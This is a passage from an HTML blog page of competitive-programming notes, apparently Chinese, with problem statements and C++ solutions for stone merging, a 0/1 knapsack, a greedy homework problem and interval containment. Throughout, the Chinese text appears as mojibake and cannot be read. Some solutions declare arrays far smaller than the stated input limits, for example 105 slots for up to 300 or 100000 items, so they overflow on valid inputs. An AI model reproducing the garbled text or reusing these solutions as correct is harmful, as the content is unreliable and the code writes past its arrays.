dp[maxc])&#123;</span><br><span class="line">maxc = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">output(maxc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ²™å­çš„è´¨é‡"><a href="#æ²™å­çš„è´¨é‡" class="headerlink" title="æ²™å­çš„è´¨é‡"></a>æ²™å­çš„è´¨é‡</h3><p>é¢˜ç›®æè¿°<br>è®¾æœ‰Nå †æ²™å­æ’æˆä¸€æ’ï¼Œå…¶ç¼–å·ä¸º1ï¼Œ2ï¼Œ3ï¼Œâ€¦ï¼ŒNï¼ˆN&lt; =300ï¼‰ã€‚æ¯å †æ²™å­æœ‰ä¸€å®šçš„æ•°é‡ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªæ•´æ•°æ¥æè¿°ï¼Œç°åœ¨è¦å°†Nå †æ²™å­åˆå¹¶æˆä¸ºä¸€å †ï¼Œæ¯æ¬¡åªèƒ½åˆå¹¶ç›¸é‚»çš„ä¸¤å †ï¼Œåˆå¹¶çš„ä»£ä»·ä¸ºè¿™ä¸¤å †æ²™å­çš„æ•°é‡ä¹‹å’Œï¼Œåˆå¹¶åä¸è¿™ä¸¤å †æ²™å­ç›¸é‚»çš„æ²™å­å°†å’Œæ–°å †ç›¸é‚»ï¼Œåˆå¹¶æ—¶ç”±äºé€‰æ‹©çš„é¡ºåºä¸åŒï¼Œåˆå¹¶çš„æ€»ä»£ä»·ä¹Ÿä¸ç›¸åŒï¼Œå¦‚æœ‰4å †æ²™å­åˆ†åˆ«ä¸º1 3 5 2æˆ‘ä»¬å¯ä»¥å…ˆåˆå¹¶1ã€2å †ï¼Œä»£ä»·ä¸º4ï¼Œå¾—åˆ°4 5 2åˆåˆå¹¶1ï¼Œ2å †ï¼Œä»£ä»·ä¸º9ï¼Œå¾—åˆ°9 2ï¼Œå†åˆå¹¶å¾—åˆ°11ï¼Œæ€»ä»£ä»·ä¸º4+9+11=24ï¼Œå¦‚æœç¬¬äºŒæ­¥æ˜¯å…ˆåˆå¹¶2ï¼Œ3å †ï¼Œåˆ™ä»£ä»·ä¸º7ï¼Œå¾—åˆ°4 7ï¼Œæœ€åä¸€æ¬¡åˆå¹¶ä»£ä»·ä¸º11ï¼Œæ€»ä»£ä»·ä¸º4+7+11=22ï¼›é—®é¢˜æ˜¯ï¼šæ‰¾å‡ºä¸€ç§åˆç†çš„æ–¹æ³•ï¼Œä½¿æ€»çš„ä»£ä»·æœ€å°ã€‚è¾“å‡ºæœ€å°ä»£ä»·ã€‚</p><h5 id="è¾“å…¥-10"><a href="#è¾“å…¥-10" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>ç¬¬ä¸€è¡Œä¸€ä¸ªæ•°Nè¡¨ç¤ºæ²™å­çš„å †æ•°Nã€‚ ç¬¬äºŒè¡ŒNä¸ªæ•°ï¼Œè¡¨ç¤ºæ¯å †æ²™å­çš„è´¨é‡ã€‚ a[i]&lt; =1000ã€‚</p><h5 id="è¾“å‡º-10"><a href="#è¾“å‡º-10" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>åˆå¹¶çš„æœ€å°ä»£ä»·ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-10"><a href="#æ ·ä¾‹è¾“å…¥-10" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 3 5 2</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-10"><a href="#æ ·ä¾‹è¾“å‡º-10" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">305</span>][<span class="number">305</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*è¿™ä¸ªé¢˜ç›®å°±æ˜¯å¦ç±»çš„çŸ©é˜µè¿ä¹˜*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">1</span>; i &lt;= n;i++) &#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">a[i] += a[i<span class="number">-1</span>];</span><br><span class="line">m[i][i] = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> r =<span class="number">2</span>; r&lt;=n;r++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n-r+<span class="number">1</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">int</span>  j = i+r<span class="number">-1</span>;</span><br><span class="line">m[i][j] = m[i+<span class="number">1</span>][j]+a[j]-a[i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = i+<span class="number">1</span>; k&lt;j; k++)&#123;</span><br><span class="line">m[i][j] = min(m[i][j],m[i][k]+m[k+<span class="number">1</span>][j]+a[j]-a[i<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="èŠ‚é£Ÿçš„é™åˆ¶"><a href="#èŠ‚é£Ÿçš„é™åˆ¶" class="headerlink" title="èŠ‚é£Ÿçš„é™åˆ¶"></a>èŠ‚é£Ÿçš„é™åˆ¶</h3><h4 id="é¢˜ç›®æè¿°-10"><a href="#é¢˜ç›®æè¿°-10" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>Bessieåƒå¥¹çš„è¯¸å¤šå§Šå¦¹ä¸€æ ·ï¼Œå› ç‚ºä»Farmer Johnçš„è‰åœ°åƒäº†å¤ªå¤šç¾å‘³çš„è‰è€Œé•¿å‡ºäº†å¤ªå¤šçš„èµ˜è‚‰ã€‚æ‰€ä»¥FJå°†å¥¹ç½®æ–¼ä¸€ä¸ªåŠå…¶ä¸¥æ ¼çš„èŠ‚é£Ÿè®¡åˆ’ä¹‹ä¸­ã€‚å¥¹æ¯å¤©ä¸èƒ½åƒå¤šè¿‡H(5&lt;=H&lt;=45000)å…¬æ–¤çš„ä¹¾è‰ã€‚Bessieåªèƒ½åƒä¸€æ•´ç¶‘ä¹¾è‰ï¼›å½“å¥¹å¼€å§‹åƒä¸€ç¶‘ä¹¾è‰çš„ä¹‹åå°±å†ä¹Ÿåœä¸ä¸‹æ¥äº†ã€‚å¥¹æœ‰ä¸€ä¸ªå®Œæ•´çš„N(1&lt;=n&lt;=50)ç¶‘å¯ä»¥ç»™å¥¹å½“ä½œæ™šé¤çš„ä¹¾è‰çš„æ¸…å•ã€‚å¥¹è‡ªç„¶æƒ³è¦å°½é‡åƒåˆ°æ›´å¤šçš„ä¹¾è‰ã€‚å¾ˆè‡ªç„¶åœ°ï¼Œæ¯ç¶‘ä¹¾è‰åªèƒ½è¢«åƒä¸€æ¬¡ï¼ˆå³ä½¿åœ¨åˆ—è¡¨ä¸­ç›¸åŒçš„é‡é‡å¯èƒ½å‡ºç°2æ¬¡ï¼Œä½†æ˜¯è¿™è¡¨ç¤ºçš„æ˜¯ä¸¤ç¶‘ä¹¾è‰ï¼Œå…¶ä¸­æ¯ç¶‘ä¹¾è‰æœ€å¤šåªèƒ½è¢«åƒæ‰ä¸€æ¬¡ï¼‰ã€‚ ç»™å®šä¸€ä¸ªåˆ—è¡¨è¡¨ç¤ºæ¯ç¶‘ä¹¾è‰çš„é‡é‡Si(1&lt;=Si&lt;=H),æ±‚Bessieä¸è¶…è¿‡èŠ‚é£Ÿçš„é™åˆ¶çš„å‰æä¸‹å¯ä»¥åƒæ‰å¤šå°‘ä¹¾è‰ï¼ˆæ³¨æ„ä¸€æ—¦å¥¹å¼€å§‹åƒä¸€ç¶‘ä¹¾è‰å°±ä¼šæŠŠé‚£ä¸€ç¶‘ä¹¾è‰å…¨éƒ¨åƒå®Œï¼‰ã€‚</p><h5 id="è¾“å…¥-11"><a href="#è¾“å…¥-11" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>ç¬¬ä¸€è¡Œï¼šä¸¤ä¸ªç”±ç©ºæ ¼éš”å¼€çš„æ•´æ•°ï¼šHå’ŒNï¼Œ ç¬¬2åˆ°N+1è¡Œï¼šç¬¬i+1è¡Œæ˜¯ä¸€ä¸ªå•ç‹¬çš„æ•´æ•°ï¼Œè¡¨ç¤ºç¬¬iç¶‘ä¹¾è‰çš„é‡é‡Siã€‚</p><h5 id="è¾“å‡º-11"><a href="#è¾“å‡º-11" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>ä¸€ä¸ªå•ç‹¬çš„æ•´æ•°è¡¨ç¤ºBessieåœ¨é™åˆ¶èŒƒå›´å†…æœ€å¤šå¯ä»¥åƒå¤šå°‘å…¬æ–¤çš„ä¹¾è‰ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-11"><a href="#æ ·ä¾‹è¾“å…¥-11" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-11"><a href="#æ ·ä¾‹è¾“å‡º-11" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">50</span>][<span class="number">45000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*æœ¬è´¨å°±æ˜¯01èƒŒåŒ…*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h,n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;h&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;= n; i++)<span class="built_in">cin</span>&gt;&gt;w[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j&lt;=h; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j &gt;= w[i]) m[i][j]=max(m[i<span class="number">-1</span>][j],m[i<span class="number">-1</span>][j-w[i]]+w[i]);</span><br><span class="line"><span class="keyword">else</span> m[i][j] = m[i<span class="number">-1</span>][j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[n][h]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="è´ªå¿ƒæ³•"><a href="#è´ªå¿ƒæ³•" class="headerlink" title="è´ªå¿ƒæ³•"></a>è´ªå¿ƒæ³•</h2><p>è¿™ç±»é¢˜ç›®è®°å¾—å…ˆæ’åºï¼ŒæŒ‰æ€æ ·çš„é¡ºåºæ’ï¼Œè‡ªå·±çœ‹æ¸…é¢˜ç›®</p><h3 id="homework"><a href="#homework" class="headerlink" title="homework"></a>homework</h3><h4 id="é¢˜ç›®æè¿°-11"><a href="#é¢˜ç›®æè¿°-11" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>ä¸´è¿‘å¼€å­¦äº†ï¼Œå¤§å®¶éƒ½å¿™ç€æ”¶æ‹¾è¡Œæå‡†  å¤‡è¿”æ ¡ï¼Œä½† I_Love_C å´ä¸ä¸ºæ­¤æ‹…å¿ƒ! å› ä¸ºä»–çš„å¿ƒæ€å…¨åœ¨æš‘å‡ä½œä¸šä¸Šï¼šç›®å‰ä¸ºæ­¢è¿˜æœªå¼€åŠ¨ã€‚</p><p>æš‘å‡ä½œä¸šæ˜¯å¾ˆå¤šå¼ è¯•å·ï¼Œæˆ‘ä»¬è¿™äº›ä»è¯•å·é‡Œçˆ¬å‡ºæ¥çš„äººéƒ½çŸ¥é“ï¼Œå·å­ä¸Šçš„é¢˜ç›®æœ‰é€‰æ‹©é¢˜ã€å¡«ç©ºé¢˜ã€ç®€ç­”é¢˜ã€è¯æ˜é¢˜ç­‰ã€‚è€Œåšé€‰æ‹©é¢˜çš„å¥½å¤„å°±åœ¨äºå·¥ä½œé‡å¾ˆå°‘ï¼Œä½†åˆå› ä¸ºé€‰æ‹©é¢˜é¢˜ç›®éƒ½æ™®éå¾ˆé•¿ã€‚å¦‚æœæœ‰ 5 å¼ è¯•å·ï¼Œå…¶ä¸­ 4 å¼ æ˜¯é€‰æ‹©é¢˜ï¼Œæœ€åä¸€å¼ æ˜¯å¡«ç©ºé¢˜ï¼Œå¾ˆæ˜æ˜¾åšæœ€åä¸€å¼ æ‰€èŠ±çš„æ—¶é—´è¦æ¯”å‰ 4 å¼ é•¿å¾ˆå¤šã€‚ä½†å¦‚æœä½ åªåšäº†é€‰æ‹©é¢˜ï¼Œè™½ç„¶å·¥ä½œé‡å¾ˆå°‘ï¼Œä½†è¡¨é¢ä¸Šçœ‹èµ·æ¥ä¹Ÿå·²ç»åšäº†4/5çš„ä½œä¸šäº†ã€‚</p><p>I_Love_Cå†³å®šå°±ç”¨è¿™æ ·çš„æ–¹æ³•æ¥è’™æ··è¿‡å…³ï¼Œä»–ç»Ÿè®¡å‡ºäº†åšå®Œæ¯ä¸€å¼ è¯•å·æ‰€éœ€çš„æ—¶é—´ä»¥åŠå®ƒåšå®Œåèƒ½å¾—åˆ°çš„ä»·å€¼ï¼ˆæŒ‰ä¸Šé¢çš„åŸç†ï¼Œé€‰æ‹©é¢˜è¶Šå¤šä»·å€¼å½“ç„¶å°±è¶Šé«˜å’¯ï¼‰ã€‚</p><p>ç°åœ¨å°±è¯·ä½ å¸®ä»–å®‰æ’ä¸€ä¸‹ï¼Œç”¨ä»–ä»…å‰©çš„ä¸€ç‚¹æ—¶é—´æ¥åšæœ€æœ‰ä»·å€¼çš„ä½œä¸šã€‚</p><h5 id="è¾“å…¥-12"><a href="#è¾“å…¥-12" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>æµ‹è¯•æ•°æ®åŒ…æ‹¬å¤šç»„ã€‚æ¯ç»„æµ‹è¯•æ•°æ®ä»¥ä¸¤ä¸ªæ•´æ•° M,N(1&lt;M&lt;20,1&lt;N&lt;10000) å¼€å¤´ï¼Œåˆ†åˆ«è¡¨ç¤ºè¯•å·çš„æ•°ç›®å’Œ I_Love_C å‰©ä¸‹çš„æ—¶é—´ã€‚æ¥ä¸‹æ¥æœ‰ M è¡Œï¼Œæ¯è¡ŒåŒ…æ‹¬ä¸¤ä¸ªæ•´æ•° T,V(1&lt;T&lt;N,1&lt;V&lt;10000)åˆ†åˆ«è¡¨ç¤ºåšå®Œè¿™å¼ è¯•å·æ‰€éœ€çš„æ—¶é—´ä»¥åŠåšå®Œåèƒ½å¾—åˆ°çš„ä»·å€¼ï¼Œè¾“å…¥ä»¥ 0 0 ç»“æŸã€‚</p><h5 id="è¾“å‡º-12"><a href="#è¾“å‡º-12" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>å¯¹åº”æ¯ç»„æµ‹è¯•æ•°æ®è¾“å‡º I_Love_C èƒ½è·å¾—çš„æœ€å¤§ä»·å€¼ã€‚ä¿ç•™å°æ•°ç‚¹ 2 ä½</p><p>æç¤ºï¼šfloat çš„ç²¾åº¦å¯èƒ½ä¸å¤Ÿï¼Œä½ åº”è¯¥ä½¿ç”¨ double ç±»å‹ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-12"><a href="#æ ·ä¾‹è¾“å…¥-12" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4 20</span><br><span class="line">4 10</span><br><span class="line">5 22</span><br><span class="line">10 3</span><br><span class="line">1 2</span><br><span class="line">0 0</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-12"><a href="#æ ·ä¾‹è¾“å‡º-12" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">37.00</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work</span>&#123;</span></span><br><span class="line"><span class="keyword">double</span> t,v;</span><br><span class="line"><span class="keyword">double</span> <span class="keyword">v_t</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(work a, work b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.<span class="keyword">v_t</span> &gt; b.<span class="keyword">v_t</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> m,n;</span><br><span class="line">work w[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;m&gt;&gt;n &amp;&amp; (m!=<span class="number">0</span> &amp;&amp; n != <span class="number">0</span>))&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt;m ;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;w[i].t&gt;&gt;w[i].v;</span><br><span class="line">w[i].<span class="keyword">v_t</span> = w[i].v/w[i].t;</span><br><span class="line">&#125;</span><br><span class="line">sort(w,w+m,cmp);</span><br><span class="line"><span class="keyword">double</span> k =<span class="number">0</span>,<span class="keyword">p_t</span> =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i&lt;m ;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">p_t</span> + w[i].t &lt;= n)&#123;</span><br><span class="line"><span class="keyword">p_t</span> += w[i].t;</span><br><span class="line">k += w[i].v;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">p_t</span> &lt; n)&#123;</span><br><span class="line">k += (n - <span class="keyword">p_t</span>)*w[i].<span class="keyword">v_t</span>;</span><br><span class="line"><span class="keyword">p_t</span> = n;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%.2lf"</span>,k);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åŒºé—´åŒ…å«é—®é¢˜"><a href="#åŒºé—´åŒ…å«é—®é¢˜" class="headerlink" title="åŒºé—´åŒ…å«é—®é¢˜"></a>åŒºé—´åŒ…å«é—®é¢˜</h3><h4 id="é¢˜ç›®æè¿°-12"><a href="#é¢˜ç›®æè¿°-12" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>å·²çŸ¥ n ä¸ªå·¦é—­å³å¼€åŒºé—´ [a,b)ï¼Œå¯¹å…¶è¿›è¡Œ m æ¬¡è¯¢é—®ï¼Œæ±‚åŒºé—´[l,r]æœ€å¤šå¯ä»¥åŒ…å« n ä¸ªåŒºé—´ä¸­çš„å¤šå°‘ä¸ªåŒºé—´ï¼Œå¹¶ä¸”è¢«åŒ…å«çš„æ‰€æœ‰åŒºé—´éƒ½ä¸ç›¸äº¤ã€‚</p><h5 id="è¾“å…¥-13"><a href="#è¾“å…¥-13" class="headerlink" title="è¾“å…¥"></a>è¾“å…¥</h5><p>è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ï¼Œå¯¹äºæ¯ç»„æµ‹è¯•æ•°æ®ï¼š</p><p>ç¬¬ä¸€è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° n ,m (1â‰¤nâ‰¤100000,1â‰¤mâ‰¤100) ã€‚</p><p>æ¥ä¸‹æ¥ n è¡Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° a ,b (0â‰¤ a&lt; bâ‰¤ 10^9) ã€‚</p><p>æ¥ä¸‹æ¥ m è¡Œæ¯è¡ŒåŒ…å«ä¸¤ä¸ªæ•´æ•° l ,r (0â‰¤ l&lt; râ‰¤ 10^9)  ã€‚</p><h5 id="è¾“å‡º-13"><a href="#è¾“å‡º-13" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h5><p>å¯¹äºæ¯ç»„æµ‹è¯•æ•°æ®ï¼Œè¾“å‡º m è¡Œï¼Œæ¯è¡ŒåŒ…å«ä¸€ä¸ªæ•´æ•°ã€‚</p><h5 id="æ ·ä¾‹è¾“å…¥-13"><a href="#æ ·ä¾‹è¾“å…¥-13" class="headerlink" title="æ ·ä¾‹è¾“å…¥"></a>æ ·ä¾‹è¾“å…¥</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">4 3</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">1 4</span><br><span class="line">1 2</span><br><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br></pre></td></tr></table></figure><h5 id="æ ·ä¾‹è¾“å‡º-13"><a href="#æ ·ä¾‹è¾“å‡º-13" class="headerlink" title="æ ·ä¾‹è¾“å‡º"></a>æ ·ä¾‹è¾“å‡º</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> s,e;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(node a,node b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span>  a.e &lt; b.e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n ,m;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">node a[<span class="number">105</span>],b[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt; n;i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i].s&gt;&gt;a[i].e;</span><br><span class="line">&#125;</span><br><span class="line">sort(a,a+n,cmp);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j&lt; m;j++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b[j].s&gt;&gt;b[j].e;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span> ;k &lt; n;k ++)&#123;</span><br><span class="line"><span class="keyword">if</span>(a[k].s &gt;= b[j].s)&#123;</span><br><span class="line"><span 